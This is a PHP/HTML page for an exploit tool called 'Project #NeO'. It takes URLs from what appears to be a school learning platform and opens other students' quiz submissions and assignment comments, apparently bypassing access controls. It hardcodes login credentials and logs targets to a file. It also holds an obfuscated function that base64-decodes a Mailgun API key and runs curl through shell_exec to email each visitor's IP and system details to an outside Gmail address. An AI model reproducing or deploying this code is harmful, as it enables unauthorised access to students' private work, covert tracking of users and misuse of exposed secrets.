<?php
$realm = 'Restricted area';

//user => password
$users = array('neo' => 'tony stark');

if (empty($_SERVER['PHP_AUTH_DIGEST'])) {
    header('HTTP/1.1 401 Unauthorized');
    header('WWW-Authenticate: Digest realm="'.$realm.
           '",qop="auth",nonce="'.uniqid().'",opaque="'.md5($realm).'"');

    die('This is a restricted file. Authorized pips only!');
}


// analyze the PHP_AUTH_DIGEST variable
if (!($data = http_digest_parse($_SERVER['PHP_AUTH_DIGEST'])) ||
    !isset($users[$data['username']]))
    die('This is a restricted file. Authorized pips only!');

// generate the valid response
$A1 = md5($data['username'] . ':' . $realm . ':' . $users[$data['username']]);
$A2 = md5($_SERVER['REQUEST_METHOD'].':'.$data['uri']);
$valid_response = md5($A1.':'.$data['nonce'].':'.$data['nc'].':'.$data['cnonce'].':'.$data['qop'].':'.$A2);

if ($data['response'] != $valid_response)
    die('This is a restricted file. Authorized pips only!');

mailboss();

// function to parse the http auth header
function http_digest_parse($txt)
{
    // protect against missing data
    $needed_parts = array('nonce'=>1, 'nc'=>1, 'cnonce'=>1, 'qop'=>1, 'username'=>1, 'uri'=>1, 'response'=>1);
    $data = array();
    $keys = implode('|', array_keys($needed_parts));

    preg_match_all('@(' . $keys . ')=(?:([\'"])([^\2]+?)\2|([^\s,]+))@', $txt, $matches, PREG_SET_ORDER);

    foreach ($matches as $m) {
        $data[$m[1]] = $m[3] ? $m[3] : $m[4];
        unset($needed_parts[$m[1]]);
    }

    return $needed_parts ? false : $data;
}


function mailboss(){

   
       $str = "MjlmMDU1NTQwOTE5ZDA0ZmFiNDdiOTY2OTAxM2E5YmYtNmUwZmQzYTQtYWIyM2M5YmY=";
       $domain = "aHR0cHM6Ly9hcGkubWFpbGd1bi5uZXQvdjMvc2FuZGJveDI3OGRiMGFhNDFmOTQ5Zjc4NzU4NzczM2NkNTBlNDFjLm1haWxndW4ub3JnL21lc3NhZ2Vz";
       $sm =  base64_decode($str);
       $sdomain = base64_decode($domain);
        $output = shell_exec("
        curl -s --user 'api:".$sm."' \
            ".$sdomain." \
            -F from='Project Neo <mailgun@sandbox278db0aa41f949f787587733cd50e41c.mailgun.org>' \
            -F to=danlyt74@gmail.com \
            -F subject='Login Report' \
            -F html='Hi boss! Access was given to<br><b>IP: ".getUserIpAddr()."</b><br>Sytem info: <pre>".sys()."</pre><br>'
            ");   
}

function sys(){
$ua = getBrowser();
$patterns = array();
$patterns1 = array();
$patterns[0] = '/Array/';
$patterns1[0] = '/\(/';
$patterns1[1] = '/\)/';
$bb= preg_replace($patterns,date("Y-m-d"),print_r($ua,true));
$dd= preg_replace($patterns1,'',$bb);

return $dd;
}
function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    
   return $ip; 
}

  function getBrowser() {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
  $bname = 'Unknown';
  $platform = 'Unknown';
  $version= "";

  // First get the platform?
  if (preg_match('/linux/i', $u_agent)) {
    $platform = 'Linux';
  } elseif (preg_match('/macintosh|intel mac os x/i', $u_agent)) {
    $platform = 'Mac';
  } elseif (preg_match('/windows|win32/i', $u_agent)) {
    $platform = 'Windows';
  }elseif (preg_match('/iPhone|like mac os x/i', $u_agent)) {
    $platform = 'iPhone';
  }elseif (preg_match('/Android/i', $u_agent)) {
    $platform = 'Android';
  }

  // Next get the name of the useragent yes seperately and for good reason
  if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) {
    $bname = 'Internet Explorer';
    $ub = "MSIE";
  } elseif(preg_match('/Firefox/i',$u_agent)) {
    $bname = 'Mozilla Firefox';
    $ub = "Firefox";
  } elseif(preg_match('/Chrome/i',$u_agent)) {
    $bname = 'Google Chrome';
    $ub = "Chrome";
  } elseif(preg_match('/Safari/i',$u_agent)) {
    $bname = 'Apple Safari';
    $ub = "Safari";
  } elseif(preg_match('/Opera/i',$u_agent)) {
    $bname = 'Opera';
    $ub = "Opera";
  } elseif(preg_match('/Netscape/i',$u_agent)) {
    $bname = 'Netscape';
    $ub = "Netscape";
  }

  // finally get the correct version number
  $known = array('Version', $ub, 'other');
  $pattern = '#(?<browser>' . join('|', $known) . ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
  if (!preg_match_all($pattern, $u_agent, $matches)) {
    // we have no matching number just continue
  }

  // see how many we have
  $i = count($matches['browser']);
  if ($i != 1) {
    //we will have two since we are not using 'other' argument yet
    //see if version is before or after the name
    if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
      $version= $matches['version'][0];
    } else {
      $version= $matches['version'][1];
    }
  } else {
    $version= $matches['version'][0];
  }

  // check if we have a number
  if ($version==null || $version=="") {$version="?";}
      
    $u_agent1 = implode('', array_unique(explode(';', $u_agent)));
    $bname1 = implode('', array_unique(explode(';', $bname)));
    $version1 = implode('', array_unique(explode(';', $version)));
    $platform1 = implode('', array_unique(explode(';', $platform)));

return array(
    'User Agent' => $u_agent1,
    'Browser'      => $bname1,
    'Browser Version'   => $version1,
    'Operating System'  => $platform1,
    );

  }

  
 
?>
    <!-- CREDITS TO THE INTERNET!! -->
    <!-- Neo Exploit Project by DAN -->
    <!-- 

    With great power comes great responsibility! 

    


























































































































































































































































































    -->
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Unauthorized Access</title>


<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

    <style>

    body,html{
    height: 100%;
    width: 100%;
    margin: 0;
    padding: 0;
    background: black !important;
    }

    .searchbar{
    margin-bottom: auto;
    margin-top: auto;
    height: 60px;
    background-color: white;
    border-radius: 50px;
    padding: 10px;
    }

    .search_input{
    color: black;
    border: 0;
    outline: 0;
    background: none;
    width: 0;
    caret-color:transparent;
    line-height: 40px;
    transition: width 0.4s linear;
    }

    .searchbar:hover > .search_input{
    padding: 0 10px;
    width: 250px;
    caret-color:red;
    transition: width 0.4s linear;
    }

    .searchbar:hover > .search_icon{
    background: white;
    color: #e74c3c;
    }

    .search_icon{
    height: 40px;
    width: 40px;
    float: right;
    display: flex;
    justify-content: center;
    align-items: center;
    border-radius: 50%;
    color:white;
    text-decoration:none;
    }
    u{
        color: white;
        padding-top: 201px;
        text-decoration-style: dotted;
    }
    #log{
        color: gray;
    }
    #history{
        padding-bottom: 10px;
    }
    #hist_m{
        font-size: 10px;
        color: lightgray;
        }           
    </style>
  </head>
  <body>


<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Target URI:</h5>
        <a href="tutorial">Tutorial</a>
        </button>
      </div>
      <div class="modal-body">
        <form method="POST" action="/success.php" target="form1">
          <div class="form-group">
            <label for="message-text" class="col-form-label">https://sample.com/user/show/123</label>
            <textarea name="targets" class="form-control" id="target-text"></textarea>
          </div>

      </div>
      <div class="modal-footer">
        <button type="button" id="cclose" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="Submit" class="btn btn-primary" style="background-color:black; border-color:white;color:white;" onclick=atis()>Generate</button>
        </form>
      </div>
    </div>
  </div>
</div>
<iframe id="form1" name="form1" style="display:none"></iframe>
<script>
$('#exampleModal').on('show.bs.modal', function (event) {
  var button = $(event.relatedTarget) // Button that triggered the modal
  var recipient = button.data('whatever') // Extract info from data-* attributes
  // If necessary, you could initiate an AJAX request here (and then do the updating in a callback).
  // Update the modal's content. We'll use jQuery here, but you could use a data binding library or other methods instead.
  var modal = $(this)
  modal.find('.modal-title').text('Target URI')
  modal.find('.modal-body input').val(recipient)
})
</script>
<center>
  <br>
  <h1 style="color:white">Welcome to Project #NeO</h1>
  <br>
  <u><code style="color:gray;cursor: crosshair;" onclick="history();">target uri history</code></u> 
  <br>
  <div id="history" style="display:none;cursor: crosshair;">
  <code id="log">
<?php
$file = file("targets.txt");
for ($i = max(0, count($file)-6); $i < count($file); $i++) {
   $check1= str_replace(' ', '',$file[$i]);
   $check2 = implode('', array_unique(explode(',', $check1)));
  
   echo  $check2;
}
?>
  </code>
  <p id=hist_m><br>click to copy/paste.</p></div>
<br>
<iframe width="320" height="280" src="https://youtu.be/ZyhrYis509A" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"></iframe>

  <br>
  <code>"from Knowledge sea power."</code>
  <br>
  <br>
  <div class="container h-100">
      <div class="d-flex justify-content-center h-100">
        <div class="searchbar">
          <input class="search_input" type="text" id="url" placeholder="Paste Target URI" onclick=empp()>
          <a type=Submit id="subm" class="search_icon" onclick=Pota()><i class="fas fa-search"></i></a>
          <br><br>
          <p id="error-message" style="color:red;"></p>
          <br>
        </div>
      </div>
    </div>
    <br>

   
  </center>

    <script>
    function haha(yyy){
  xxx = document.getElementById(yyy);
  xxx.select();
  xxx.setSelectionRange(0, 99999)
  document.execCommand("copy");


    document.getElementById('error-message').style.color = "white";
        document.getElementById('error-message').innerHTML = "copied";
        var elmnt = document.getElementById("error-message");
        elmnt.scrollIntoView();


  
  }
        
        function history() {  
            var x = document.getElementById("history");
        if (x.style.display == "none") {
            x.style.display = "block";
        } else {
            x.style.display = "none";
        }
        } 

function empp(){
  document.getElementById('error-message').innerHTML = "";
}
  

function Pota(){
  x = document.getElementById('url').value;
   try{
      
      const domain = (new URL(x)).hostname.replace('www.','');
      const segments = new URL(x).pathname.split('/');
      const act = segments.pop() || segments.pop();
    

        if(x.includes("freeform")){

          document.getElementById('error-message').style.color = "white";
          document.getElementById('error-message').innerHTML = "attempting..";

          var attr = document.createAttribute('data-toggle');
          attr.value="modal";
          document.getElementById("subm").setAttributeNode(attr);

          var attr1 = document.createAttribute('data-target');
          attr1.value="#exampleModal";
          document.getElementById("subm").setAttributeNode(attr1);
  
          
             
        }else if(x.includes("dropbox")){

          document.getElementById('error-message').style.color = "white";
          document.getElementById('error-message').innerHTML = "attempting..";
          
          
          var attr = document.createAttribute('data-toggle');
          attr.value="modal";
          document.getElementById("subm").setAttributeNode(attr);

          var attr1 = document.createAttribute('data-target');
          attr1.value="#exampleModal";
          document.getElementById("subm").setAttributeNode(attr1);

        
          }else if(x.includes("quiz")){
            //result_id
            quiz = new URL(x);
            var result = quiz.searchParams.get("results");
             document.getElementById('error-message').style.color = "white";
             document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
              window.open("https://"+domain+"/student_quiz_assignment/submission/"+act+"?results="+result, '_blank');
            
            }else if(x.includes("student_lesson")){
              document.getElementById('error-message').innerHTML = "visit /tutorial for more details.";
            }else{
          document.getElementById('error-message').style.color = "red";
          document.getElementById('error-message').innerHTML = "activity not found.";
          var elmnt = document.getElementById("error-message");
          elmnt.scrollIntoView();
          }
        

   }catch(error){
    document.getElementById('error-message').style.color = "red";
    document.getElementById('error-message').innerHTML = "invalid url.";
    var elmnt = document.getElementById("error-message");
    elmnt.scrollIntoView();
   }
  }

  function atis(){
    x = document.getElementById('url').value;
    y = document.getElementById('target-text').value;

   try{
      
      const domain = (new URL(x)).hostname.replace('www.','');
      const segments = new URL(x).pathname.split('/');
      const act = segments.pop() || segments.pop();
    

        if(x.includes("freeform")){
          
          document.getElementById('error-message').style.color = "white";
          document.getElementById('error-message').innerHTML = "attempting..";

              if(document.getElementById('target-text').value === ""){
                document.getElementById('error-message').style.color = "white";
                document.getElementById("cclose").click();
                document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
                window.open("https://"+domain+"/student_freeform_assignment/comments_given/"+act, '_blank');
              }else{
                document.getElementById('error-message').style.color = "white";
                document.getElementById("cclose").click();
                document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
                window.open("https://"+domain+"/student_freeform_assignment/leave_comment/"+act+"?student="+y.replace(/[^0-9]/g, ''), '_blank');
              }
        }else if(x.includes("dropbox")){
          
          document.getElementById('error-message').style.color = "white";
          document.getElementById('error-message').innerHTML = "attempting..";

          if(document.getElementById('target-text').value == ""){
            document.getElementById('error-message').style.color = "white";
            document.getElementById("cclose").click();
            document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
            window.open("https://"+domain+"/student_dropbox_assignment/comments_given/"+act, '_blank');
              }else{
               document.getElementById('error-message').style.color = "white";
               document.getElementById("cclose").click();
               document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
               window.open("https://"+domain+"/student_dropbox_assignment/leave_comment/"+act+"?student="+y.replace(/[^0-9]/g, ''), '_blank');
              }
          }else if(x.includes("quiz")){
            //result_id
            quiz = new URL(x);
            var result = quiz.searchParams.get("results");
             document.getElementById('error-message').style.color = "white";
             document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
            window.open("https://"+domain+"/student_quiz_assignment/submission/"+act+"?results="+result, '_blank');
            
            }else if(x.includes("student_lesson")){
              document.getElementById('error-message').innerHTML = "visit /tutorial for more details.";
            }else{
          document.getElementById('error-message').style.color = "red";
          document.getElementById('error-message').innerHTML = "activity not found.";
          document.getElementById("cclose").click();
          var elmnt = document.getElementById("error-message");
          elmnt.scrollIntoView();
          }
        

   }catch(error){
        document.getElementById('error-message').style.color = "red";
        document.getElementById('error-message').innerHTML = "invalid url.";
        document.getElementById("cclose").click();
        var elmnt = document.getElementById("error-message");
        elmnt.scrollIntoView();

   }
  }
  

</script>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
  </body>
</html>
